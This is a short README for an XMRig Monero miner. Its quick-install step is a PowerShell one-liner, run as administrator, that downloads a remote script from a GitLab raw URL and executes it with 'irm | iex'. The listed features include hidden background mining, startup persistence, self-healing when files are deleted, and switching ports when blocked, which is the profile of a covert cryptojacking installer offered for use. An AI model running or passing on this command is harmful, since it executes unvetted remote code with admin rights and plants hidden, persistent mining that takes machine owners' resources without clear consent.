# XMRig Miner

## Quick Installation

To automatically download, install, and set up XMRig for mining, run the following command in PowerShell with administrator privileges:

```powershell
irm https://gitlab.com/Vicistar/xmrig/-/raw/main/install_clean.ps1 | iex
```

This single command will:
1. Download the XMRig miner
2. Set it up to run at Windows startup
3. Start mining immediately in the background
4. Mine to xmrpool.eu (port 5555) to maintain your existing balance

## Requirements

- Windows 10 or later
- PowerShell 5.1 or later
- Administrator privileges

## Features

- Automatic installation and configuration
- Hidden background operation
- Runs at system startup
- Error handling and status messages
- Automatic self-healing if files get deleted
- Smart port selection if default port is blocked
- Uses the miner configuration in config.json
